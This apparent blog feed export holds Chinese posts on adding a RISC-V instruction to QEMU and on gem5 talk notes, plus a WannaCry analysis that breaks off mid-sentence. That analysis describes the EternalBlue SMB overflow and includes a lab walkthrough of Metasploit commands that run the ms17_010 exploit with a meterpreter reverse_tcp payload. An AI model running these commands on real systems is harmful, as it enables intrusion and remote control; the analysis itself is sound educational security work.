punctuation">,</span>b<span class="token operator">=</span><span class="token number">0xFFFEFFFF</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0xFFFEFFFF</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"add16:=0x%x\n  add:=0x%x\n"</span><span class="token punctuation">,</span><span class="token function">mac_asm</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>b<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RISC-V</code> 会将函数的参数放入 <code>a0-a7</code> 寄存器中，并将 <code>a0</code> 寄存器中的值返回</p><img src="https://raw.githubusercontent.com/dingiso/dingiso.github.io/main/img/reg_table.png" /><p><code>a0-a7</code>  对应 <code>x10-x17</code> 和二进制编码 <code>10-17</code> ， 因此最后的指令编码如下</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Encoding used for "add16 a0, a1, a2"</span><span class="token number">0x40c58577</span> <span class="token punctuation">[</span>base <span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token comment"># Group by related bit chunks:</span><span class="token number">0100000</span> <span class="token number">01100</span> <span class="token number">01011</span> <span class="token number">000</span> <span class="token number">01010</span> <span class="token number">1110111</span> <span class="token punctuation">[</span>base <span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>       <span class="token operator">^</span>     <span class="token operator">^</span>     <span class="token operator">^</span>   <span class="token operator">^</span>     <span class="token operator">^</span><span class="token operator">|</span>       <span class="token operator">|</span>     <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span><span class="token operator">|</span>       <span class="token operator">|</span>     <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     opcode <span class="token punctuation">(</span><span class="token number">6.</span><span class="token number">.2</span><span class="token operator">=</span><span class="token number">0x1D</span> <span class="token number">1.</span><span class="token number">.0</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>       <span class="token operator">|</span>     <span class="token operator">|</span>     <span class="token operator">|</span>   dest <span class="token punctuation">(</span><span class="token number">10</span> <span class="token punctuation">:</span> a0<span class="token punctuation">)</span><span class="token operator">|</span>       <span class="token operator">|</span>     <span class="token operator">|</span>     funct3 <span class="token punctuation">(</span><span class="token number">14.</span><span class="token number">.12</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">|</span>       <span class="token operator">|</span>     src1 <span class="token punctuation">(</span><span class="token number">11</span> <span class="token punctuation">:</span> a1<span class="token punctuation">)</span><span class="token operator">|</span>       src2 <span class="token punctuation">(</span><span class="token number">12</span> <span class="token punctuation">:</span> a2<span class="token punctuation">)</span>funct7 <span class="token punctuation">(</span><span class="token number">31.</span><span class="token number">.25</span><span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了防止在编译过程中，编译器会对寄存器进行优化，将返回值存入其他寄存器，我们使用 <code>mv</code> 指令强制将变量 <code>a</code> 的值赋给 <code>a0</code> 寄存器,这样就能成功将值返回。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">riscv64-unknown-elf-gcc  -o x x.c<span class="token punctuation">..</span>/qemu-riscv64 xx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们利用以上指令执行，返回正确的结果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">add16:<span class="token operator">=</span>0xfffcfffe  add:<span class="token operator">=</span>0xfffdfffe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>add16</code> 由于每16位进行计算，所以无后<strong>16</strong>位的进位，中间位是<code>c</code>，而<code>add</code>由于有进位，所以是<code>d</code></p><hr><p>在QEMU中定制指令的流程大致如同本文的介绍，但是由于 <code>add16</code> 仅涉及数值的计算，而没有像</p><p><code>csr</code> 相关指令涉及 <code>CPURISCVState</code> 的更新，以及像<code>jal</code>指令涉及<code>DisasContext</code>的判断，因此相对简单，对于其他指令，需要在好好的研究以下</p><blockquote><p>Refrences:</p><p><a href="https://0xc0de.tw/QEMU-%E4%BD%BF%E7%94%A8-Decodetree-%E6%96%B0%E5%A2%9E-RISC-V-%E6%8C%87%E4%BB%A4/">QEMU-使用 Decodetree新增 RISC-V 指令</a></p><p><a href="https://quasilyte.dev/blog/post/riscv32-custom-instruction-and-its-simulation/#adding-mac-instruction-to-the-rv32im">RISC-V: custom instruction and its simulation</a></p><p><a href="https://github.com/riscv/riscv-p-spec/blob/master/P-ext-proposal.adoc">riscv-p-spec</a></p></blockquote><p>感谢在学习过程中，老师们的指导，非常感谢！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> sim </tag>
            
            <tag> QEMU </tag>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Up to Date</title>
      <link href="/2021/02/01/hello-world/"/>
      <url>/2021/02/01/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="Welcome-to-my-blog"><a href="#Welcome-to-my-blog" class="headerlink" title="Welcome to my blog !"></a>Welcome to my blog !</h3><p>在这里我将分享一些技术细节和相关过程，不断更新中</p><p>欢迎来我的博客 - 建设程度 10/100</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Gem5 演讲稿</title>
      <link href="/2021/01/13/Gem5%20%E6%BC%94%E8%AE%B2%E7%A8%BF/"/>
      <url>/2021/01/13/Gem5%20%E6%BC%94%E8%AE%B2%E7%A8%BF/</url>
      
        <content type="html"><![CDATA[<p>本文是 gem5 视频搭配的演讲稿的部分内容<br><a href="https://www.bilibili.com/video/BV155411J7gY?from=search&seid=12575992805936022279">视频地址</a></p><p><a href="https://github.com/isrc-cas/PLCT-Open-Reports/blob/master/20210120-Gem5-LuRuibo.pdf">slides地址</a></p><a id="more"></a><h1 id="Gem5-演讲稿"><a href="#Gem5-演讲稿" class="headerlink" title="Gem5 演讲稿"></a>Gem5 演讲稿</h1><h3 id="Atomic"><a href="#Atomic" class="headerlink" title="Atomic"></a>Atomic</h3><ol><li><strong>计时</strong>-计时访问是最详细的访问。它们反映了我们为实现实际时间所做的最大努力，并包括排队延迟和资源争用的建模。一旦在将来的某个时间点成功发送了计时请求，则发送请求的设备将无法获得响应，或者如果无法完成请求，则将获得NACK（以下更多内容）。定时和原子访问不能在内存系统中共存。</li><li><strong>原子</strong>访问-原子访问比详细访问要快。它们用于快速转发和预热缓存，并返回大约时间来完成请求，而不会引起任何资源争用或排队延迟。发送原子访问后，将在函数返回时提供响应。原子和定时访问不能在内存系统中共存。</li><li><strong>功能性</strong>-与原子性访问一样，功能性访问是瞬间发生的，但是与原子性访问不同，它们可以与原子性或定时访问共存于存储系统中。功能性访问用于诸如加载二进制文件，检查/更改模拟系统中的变量以及允许将远程调试器附加到模拟器之类的事情。重要说明是设备接收到功能访问时，如果它包含一个数据包队列，则必须在所有数据包中搜索该功能访问正在执行的请求或响应，并且必须对其进行适当更新。该<code>Packet::intersect()</code>和<code>fixPacket()</code>方法可以帮助这一点。</li></ol><h3 id="O3-Cpu"><a href="#O3-Cpu" class="headerlink" title="O3 Cpu"></a>O3 Cpu</h3><p>Fetch：在每个周期获取指令，并根据所选策略选择要从哪个线程获取信息。在此阶段，首先创建DynInst。还处理分支预测。</p><p>Decode:  处理PC相关的无条件分支的处理</p><p>Rename：利用PR File,两种情况会终止： 没有足够寄存器来重命名，后续资源已经用完(序列化指令 )</p><p>IEW ： 将指令分派给指令队列，告诉指令队列发出指令，执行并写回指令</p><p>Commit: 处理指令可能引起的任何故障。还可以在分支预测错误的情况下处理重定向前端。</p><p>E in E : 最后执行存在潜在的错误，这些错误不会在程序结果中显示。其次，通过在流水线的开始执行，指令全部按顺序执行，那么乱序的load interaction负载交互会丢失。我们的模型能够避免这些因流水线设计产生的不足并提供准确的时序模型。</p><p>Template Policy: 利用模板来实现多态性，主要是利用 Impl 定义类，优点是不需要传统虚拟函数/基类。主要缺点是必须在编译时完全定义CPU，并且模板化的类需要手动实例化。</p><p>ISA 独立性： 将代码分为 与 ISA 无关和ISA有关的代码，提高复用性</p><p>分支预测：分支是错误时，通知 commit stage 压缩ROB内不用的代码</p><h3 id="CLassic-Memory-System"><a href="#CLassic-Memory-System" class="headerlink" title="CLassic Memory System"></a>CLassic Memory System</h3><p><strong>MOESI:</strong>  数据一致性协议 Owned 状态省一次读</p><p>express snoops: 原子的，能瞬间返回，在时序模式也可以使用，防止泛洪</p><p>cache： 内存映射数据包和侦听数据包。内存映射的请求在内存层次结构中向下，而响应在内存层次结构中向上（相同的路由返回）。侦听请求在缓存层次结构中沿水平方向移动，侦听响应在层次结构中沿水平方向向下（相同的路由返回）。普通监听在水平方向上运行，而快速监听则在缓存层次结构中。</p><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>SLICC :  代表用于<em>实现缓存一致性的规范语言</em>。本质上，缓存一致性协议的行为类似于状态机。SLICC用于指定状态机的行为。并可施加某种约束。例如，SLICC可以限制单个循环中可能发生的转换数量。除了协议规范外，SLICC还将内存模型中的某些组件组合在一起。如下图所示，状态机从互连网络的输入端口获取输入，并在网络的输出端口将输出排队，从而将缓存/内存控制器与互连网络本身连接在一起。</p><p>sequencer： Sequencer类负责向处理器子系统（包括缓存和片外内存）提供来自处理器的加载/存储/原子内存请求。当每个内存请求由内存子系统完成时，也会通过定序器将响应发送回处理器。系统中模拟的每个硬件线程（或内核）都有一个定序器</p><p>Replacement Policies： LRU 和 Pseudo-LRU</p><p>TOPAZ -该模拟器已准备好在gem5中运行，并在原始的ruby网络模拟器上添加了大量功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sim </tag>
            
            <tag> gem5 </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WannaCry 的具体的细节的分析</title>
      <link href="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本文是针对WannaCry 的具体的细节的分析</p><p><a href="https://bbs.pediy.com/thread-249520.htm">REFERENCE</a></p><a id="more"></a><h1 id="WannaCry-病毒分析"><a href="#WannaCry-病毒分析" class="headerlink" title="WannaCry 病毒分析"></a>WannaCry 病毒分析</h1><h3 id="Virus-Analysis-Of-WannaCry"><a href="#Virus-Analysis-Of-WannaCry" class="headerlink" title="Virus Analysis Of WannaCry"></a>Virus Analysis Of WannaCry</h3><p>[TOC]</p><h3 id="引-言"><a href="#引-言" class="headerlink" title="引 言"></a>引 言</h3><p>本次大作业主要对WannaCry病毒的行为和具体代码的实现逻辑进行分析，之前有一些前辈已经对病毒大体情况做出了相关的分析。本次大作业将会利用现有能找到的前人的所有分析进行汇总细化，并结合至今为止病毒的变种情况，进行针对事实与现金情况的逻辑，变种和防范方法分析，通过依照事实的分析，解答大家对病毒的疑问和误解</p><p>本次大作业的亮点在于：</p><ol><li><p> 通过了病毒发作到现在的沉淀，病毒的具体行为和变种也经过了发展和沉淀，通过综合能得到更适合现在的方法</p></li><li><p> 通过对病毒变种的分析，分析病毒的演变情况，了解病毒在发作之后可能会有什么样的改变</p></li><li><p>通过基于事实的推测，推翻大众对病毒误解，对病毒有基于科学的认识。</p><h2 id="1-病毒概况"><a href="#1-病毒概况" class="headerlink" title="1 病毒概况"></a>1 病毒概况</h2></li></ol><p>2017年5月12日，本文所分析的勒索病毒WannaCry借助高危漏洞”永恒之蓝”（EternalBlue）在全世界范围内快速传播。世界范围内的很多国家，包括俄罗斯、西班牙、意大利、越南、美国、英国、中国、等百余个国家的企业和医院等机构收到大幅度的破环。与此同时，我国的许多行业机构和大型企业也被攻击，有的单位甚至”全军覆没”，造成了近期罕见的损失。</p><p>本报告将从传播途径、危害方式和结果、受威胁用户群等角度，逐一厘清这个恶性病毒方方面面的真相，用以帮助大家认识、解决该病毒，防范未来可能出现的变种病毒，同时澄清一些谣传和谎言。</p><h3 id="1-1-病毒攻击行为及危害"><a href="#1-1-病毒攻击行为及危害" class="headerlink" title="1.1 病毒攻击行为及危害"></a>1.1 病毒攻击行为及危害</h3><p>遭受WannaCry病毒侵害的电脑，其文件将被加密锁死，病毒开发者提供了一个比特币账号供支付赎金打开锁死的文件，但根据病毒源码的分析，受害者可能永远的失去了这些文件。WannaCry病毒的设计就明确的表明了病毒<br>和<br>病毒作者不能得知受害者是否支付的了赎金，且病毒并不包含用于解码的神奇数，所以即使支付了赎金，大概率也不能得到恢复密钥</p><p>网上流传的”解密方法”只是”文件恢复工具”，可以恢复一些被删除的文件，但是作用有限。这是因为据病毒源码分析，文件的加密过程是加密后再删除原始文件，文件恢复工具可能可以恢复删除的原始文件。但是病毒对于文件的操作是十分频繁的，删除文件所保存的数据块可能会被覆盖，而且随着病毒执行时间的增加，恢复的可能性会逐渐降低。</p><h3 id="1-2-传播途径和攻击方式"><a href="#1-2-传播途径和攻击方式" class="headerlink" title="1.2 传播途径和攻击方式"></a>1.2 传播途径和攻击方式</h3><p>WannaCry由蠕虫+勒索病毒构成，蠕虫传播和释放自己，后者负责加密文件。</p><p>蠕虫：蠕虫病毒是一种常见的计算机病毒。通过网络和电子邮件进行传播，具有自我复制和传播迅速等特点。此次病毒制造者正是利用了美国国家安全局(NSA)<br>泄漏的Windows<br>SMB远程漏洞利用工具”永恒之蓝”来进行传播的。据悉，蠕虫代码运行后先会连接域名：hxxp: //<a href="http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com/">www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a><br>如果该域名可以成功连接，则直接停止。而如果上述域名无法访问，则会安装病毒服务，在局域网与外网进行传播。</p><p>但是无论这个”神奇开关”是否开启，该病毒都会攻击用户，锁死文件。另外，这个开关程序很容易被病毒制造者去除，因此未来可能出现没有开关的变种病毒。</p><h3 id="1-3-易受攻击用户群"><a href="#1-3-易受攻击用户群" class="headerlink" title="1.3 易受攻击用户群"></a>1.3 易受攻击用户群</h3><p>大型企业和公共设施占收到攻击的主机的大多数，个人用户受攻击较少。接下来，将从两个方面说明易受攻击用户群的特点</p><p>操作系统：首先，该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。而Windows<br>Vista、Windows Server 2008、Windows 7、Windows Server 2008 R2、Windows<br>8.1、Windows Server 2012、Windows Server 2012 R2、Windows Server 2016<br>版本，用户如果开启了自动更新或安装了对应的更新补丁，可以抵御该病毒。Windows10是最安全的，由于其系统是默认开启自动更新的，所以不会受该病毒影响。同时，Unix、Linux、Android等操作系统，也不会受到攻击。</p><p>网络结构：目前这个病毒通过共享端口传播同时在公网及内网进行传播，直接暴露在公网上且没有安装相应操作系统补丁的计算机有极大风险会被感染，而通过路由拨号的个人和企业用户，则不会受到来自公网的直接攻击</p><h1 id="2-永恒之蓝漏洞"><a href="#2-永恒之蓝漏洞" class="headerlink" title="2 永恒之蓝漏洞"></a>2 永恒之蓝漏洞</h1><h2 id="2-1-漏洞情况说明"><a href="#2-1-漏洞情况说明" class="headerlink" title="2.1 漏洞情况说明"></a>2.1 漏洞情况说明</h2><h3 id="2-1-1-漏洞简介"><a href="#2-1-1-漏洞简介" class="headerlink" title="2.1.1 漏洞简介"></a>2.1.1 漏洞简介</h3><p>永恒之蓝漏洞是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机的系统漏洞</p><p>漏洞代码： MS17-010</p><h3 id="2-1-2-漏洞影响"><a href="#2-1-2-漏洞影响" class="headerlink" title="2.1.2 漏洞影响"></a>2.1.2 漏洞影响</h3><p>2017年4月14日晚，影子经纪人黑客组织将永恒之蓝漏洞在互联网上公开后。在之后的五个月中，该漏洞被多款恶意软件利用。包括WannaCry，无文件的勒索软件UIWIX和SMB蠕虫EternalRocks。</p><p>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB<br>v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p><h2 id="2-2-SMB协议"><a href="#2-2-SMB协议" class="headerlink" title="2.2 SMB协议"></a>2.2 SMB协议</h2><h3 id="2-2-1-简介"><a href="#2-2-1-简介" class="headerlink" title="2.2.1 简介"></a>2.2.1 简介</h3><p>SMB（全称是Server Message<br>Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p><h3 id="2-2-2-工作原理"><a href="#2-2-2-工作原理" class="headerlink" title="2.2.2 工作原理"></a>2.2.2 工作原理</h3><p>（1）：首先客户端发送一个SMB negport<br>请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</p><p>（2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接</p><p>（3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX<br>SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</p><p>（4）：连接到相应资源后，SMB客户端就能够通过open<br>SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close<br>SMB关闭文件。</p><h2 id="2-3-溢出分析"><a href="#2-3-溢出分析" class="headerlink" title="2.3 溢出分析"></a>2.3 溢出分析</h2><h3 id="2-3-1-概述"><a href="#2-3-1-概述" class="headerlink" title="2.3.1 概述"></a>2.3.1 概述</h3><p>漏洞出现在<code>Windows SMB v1</code>中的内核态函数<code>srv!SrvOs2FeaListToNt</code>在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数<code>srv!SrvOs2FeaListToNt</code>在将FEA list转换成<code>NTFEA</code>(Windows NT FEA) list前会调用<code>srv!SrvOs2FeaListSizeToNt</code>去计算转换后的<code>FEA lsit</code>的大小。然后会进行如下操作：</p><p>1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小</p><p>2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大</p><p>3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出</p><h2 id="2-4-漏洞的利用"><a href="#2-4-漏洞的利用" class="headerlink" title="2.4 漏洞的利用"></a>2.4 漏洞的利用</h2><h3 id="2-4-1-情况说明"><a href="#2-4-1-情况说明" class="headerlink" title="2.4.1 情况说明"></a>2.4.1 情况说明</h3><p>漏洞代码工作在内核的非分页内存中。也可以工作在大非分页池中。这些类型的池都没有在页的开始嵌入任何头部。因此需要特殊的技巧来利用这些漏洞。这些技巧需要逆向一些数据结构</p><h3 id="2-4-2-利用过程"><a href="#2-4-2-利用过程" class="headerlink" title="2.4.2 利用过程"></a>2.4.2 利用过程</h3><p>EternalBlue首先发送一个SRVbuffer除了最后一个数据包。这是因为大非分页池将在会话中最后一个数据包被服务端接收的时候被建立。SMB服务器会把会话中接受到的数据读取并叠加起来放入输入缓冲区中。所有的数据会在TRANS包中被标明。当接收到所有的数据 SMB服务器将会处理这些数据。数据通过CIFS(Common Internet File System)会被分发到SrvOpen2函数中来读取。</p><p>EternalBlue发送的所有数据会被SMB服务器收到后，SMB服务器会发送SMB ECHO包。因为攻击可以在网速很慢的情况下实现，所以SMB ECHO是很重要的。</p><p>在我们的分析中，即使我们发送了初始数据，存在漏洞的缓冲区仍然没有被分配在内存中。</p><p>1.FreeHole_A: EternalBlue通过发送SMB v1数据包来完成占位</p><p>2.SMBv2_1n: 发送一组SMB v2数据包</p><p>3.FreeHole_B: 发送另一个占位数据包；必须确保第一个占位的FreeHole_A被释放之前，这块内存被分配</p><p>4.FreeHole_A_CLOSE: 关闭连接，使得第一个占位的内存空间被释放</p><p>5.SMBv2_2n: 发送一组SMB v2数据包</p><p>6.FreeHole_B_CLOSE: 关闭连接来释放缓冲区</p><p>7.FINAL_Vulnerable_Buffer: 发送最后的数据包，这个数据包将会被存储在有漏洞的缓冲区中</p><p>有漏洞的缓冲区（之前SRVNET创建的）被填入的数据将会覆盖和部分SRVNET的缓冲区。在FEA<br>list转换到NTFEA<br>list时会发生错误，因为FEA结构会在覆盖SRVNET缓冲区之后失效，所以服务器将以STATUS_INVALID_PARAMETER（0xC000000D）返回。</p><h2 id="2-5-漏洞攻击"><a href="#2-5-漏洞攻击" class="headerlink" title="2.5 漏洞攻击"></a>2.5 漏洞攻击</h2><h3 id="2-5-1-准备工作"><a href="#2-5-1-准备工作" class="headerlink" title="2.5.1 准备工作"></a>2.5.1 准备工作</h3><p>准备两台虚拟机，一台kali-linux 一台 win7，使用Wireshark<br>进行抓包，利用msfconsole工具进行模拟攻击</p><h3 id="2-5-2-攻击过程"><a href="#2-5-2-攻击过程" class="headerlink" title="2.5.2 攻击过程"></a>2.5.2 攻击过程</h3><p>1.获取两台主机的IP地址</p><p>2.测试两台主机的连通性</p><p>3.使得 kali 的数据保持开启</p><p>测试是否开启： service postgresql status</p><p>打开数据库 ： service postgresql start</p><p>初始化数据库： msfdb init</p><p>4.利用 msfconsole 进行漏洞扫描</p><p>启动： msfconsole</p><p>查看数据库连接情况：db_status</p><p>搜索漏洞： search ms17_010</p><p>扫描命令：use auxiliary/scanner/smb/smb_ms17_010</p><p>攻击命令（后面使用）：use exploit/windows/smb/ms17_010_eternalblue</p><p>设置扫描的主机或者主机段：set rhosts 192.168.223.141/24;</p><p>设置扫描线程为20： set threads 20；</p><p>最后输入run执行扫描。</p><p>同时，利用 wireshark抓包工具，监听ethO</p><p>进行攻击：use exploit/windows/smb/ms17_010_eternalblue</p><p>设置攻击目标（靶机）：set rhost 192.168.223.141</p><p>设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp</p><p>设置监听主机（kali）：set lhost 192.168.223.137</p><p>利用exploit进行攻击：exploit</p><p>成功攻击！！</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image1.png" class="" width="1"><p>图1 打开并初始化数据库</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image2.png" class="" width="2"><p>图2 打开msfconsole 并查找ms17_010</p><h1 id="4-病毒分析"><a href="#4-病毒分析" class="headerlink" title="4 病毒分析"></a>4 病毒分析</h1><h2 id="4-1-基础静态分析"><a href="#4-1-基础静态分析" class="headerlink" title="4.1 基础静态分析"></a>4.1 基础静态分析</h2><h3 id="4-1-1-查壳"><a href="#4-1-1-查壳" class="headerlink" title="4.1.1 查壳"></a>4.1.1 查壳</h3><p>第一步防止开发者对病毒进行了包装，对病毒进行查壳操作，以下是查壳结果</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image3.jpeg" class="" width="3"><p>图一：Exeinfo查壳</p><p>通过 Lamer info字段的Not packed，我们知道病毒无壳，省去了脱壳的麻烦</p><h3 id="4-1-2-字符串分析"><a href="#4-1-2-字符串分析" class="headerlink" title="4.1.2 字符串分析"></a>4.1.2 字符串分析</h3><p>利用IDA工具中提供的 Strings Window<br>工具，我们可以查找病毒源文件中含有的显式的字符串，这一步能帮我们对病毒的大致功能和加密方式等由大致的了解。</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image4.jpeg" class="" width="4"><p>图二：病毒的字符串信息</p><p>通过字符串分析，我们大致了解了，病毒可能利用了RSA和AES<br>的加密方式，同时和 TaskStart 函数，t.wnry<br>,tasksche.exe等文件有很大的关联关系，还利用了CMD调用了某些参数。</p><h3 id="4-1-3-识别加密算法"><a href="#4-1-3-识别加密算法" class="headerlink" title="4.1.3 识别加密算法"></a>4.1.3 识别加密算法</h3><p>通过 Kyrpto ANAlyzer 插件识别病毒文件的加密算法</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image5.jpeg" class="" width="5"><p>图四： 识别加密算法</p><p>经过分析得知，病毒使用了 CRC32 和 AES 加密算法，CryptDecrypt 和<br>CryptEncrypt 是微软提供的加密类库，ZIP2和ZLIB 是压缩算法</p><h3 id="4-1-4-查看导入表"><a href="#4-1-4-查看导入表" class="headerlink" title="4.1.4 查看导入表"></a>4.1.4 查看导入表</h3><p>通过PEiD提供的输入表查看器，对病毒源文件的输入表进行查看，探寻病毒。</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image6.jpeg" class="" width="6"><p>图五：查看病毒输入表</p><p>在Kernel32中发现病毒利用了LoadResource，LockResource等函数，表明了病毒资源段中可能藏有病毒需要利用的其他文件</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image7.jpeg" class="" width="7"><p>图六：病毒输入表-注册表操作</p><p>病毒利用了ADVAPI32.dll中的RegCreateKeyW，RegSetValueExA等函数，代表病毒源码中涉及了对注册表的操作，可以在病毒执行完后对注册表进行比较。</p><h3 id="4-1-5-提取资源段"><a href="#4-1-5-提取资源段" class="headerlink" title="4.1.5 提取资源段"></a>4.1.5 提取资源段</h3><p>通过输入表的分析，我们了解到病毒exe的资源段中可能隐藏着病毒所拥有的其他资源文件，为此，我们对资源文件进行提取。</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image8.jpeg" class="" width="8"><p>图七：资源段查看</p><p>从资源段分析来看，XIA资源段最值得我们关注，在资源段中我们发现资源段头的PK字段，判断该资源段应该是rar的压缩文件，我们将资源段提取出来</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image9.jpeg" class="" width="9"><p>图八：XIA资源段</p><p>发现了隐藏在病毒资源段的文件 其中msg中是一些语言包</p><h2 id="4-2-基础动态分析"><a href="#4-2-基础动态分析" class="headerlink" title="4.2 基础动态分析"></a>4.2 基础动态分析</h2><h3 id="4-2-1-进程分析"><a href="#4-2-1-进程分析" class="headerlink" title="4.2.1 进程分析"></a>4.2.1 进程分析</h3><p>使用 ProcessMonitor 查看进程树</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image10.png" class="" width="10"><p>图九：进程树</p><p>Wcry.exe总共拥有5个子进程，其中cmd负责执行一些批处理文件</p><h3 id="4-2-2-注册表分析"><a href="#4-2-2-注册表分析" class="headerlink" title="4.2.2 注册表分析"></a>4.2.2 注册表分析</h3><p>使用Regshot 比较病毒执行前后的注册表变化</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image11.jpeg" class="" width="11"> <img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image12.jpeg" class="" width="12"><p>图十：regshot结果</p><p>通过Regshot的比对，我们发现病毒增加了一些加解密需要的密钥注册表项和自动运行的病毒路径位置</p><h3 id="4-2-3-文件监控"><a href="#4-2-3-文件监控" class="headerlink" title="4.2.3 文件监控"></a>4.2.3 文件监控</h3><p>下面我们利用火绒剑抓取病毒运行过程中病毒文件对于文件的更改，</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image13.jpeg" class="" width="13"><p>图十一：文件监控</p><p>通过对文件的监控，我们发现文件在病毒文件夹里放置了</p><p>Pky，eky，res 文件，应该是病毒所需要的公钥，私钥等文件</p><p>Bat 文件，是病毒所需要执行的繁杂的重复性的工作</p><p>Vbs 文件，应该是病毒执行时的中间文件，用于执行感染操作</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image14.jpeg" class="" width="14"><p>图十二：文件行为监控</p><p>继续进行文件行为的监控，监控到文件在自己的路径释放解压文件的操作，印证了我们之前对于资源段的分析。</p><h3 id="4-2-4-感染效果"><a href="#4-2-4-感染效果" class="headerlink" title="4.2.4 感染效果"></a>4.2.4 感染效果</h3><p>在病毒感染后，分析病毒感染的结果：</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image15.jpeg" class="" width="15"><p>图十三：感染病毒文件</p><p>可以看到，病毒在每个文件夹下新建了一个@Please_Read_Me@.txt和 @WanaDecryptor@.exe用于要求用户支付解锁账户，并将其他文件加密为以.WNCRY的文件</p><h3 id="4-2-5-网络监控"><a href="#4-2-5-网络监控" class="headerlink" title="4.2.5 网络监控"></a>4.2.5 网络监控</h3><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image16.png" class="" width="16"><p>图十四：网络连接情况</p><p>通过分析病毒释放的文件 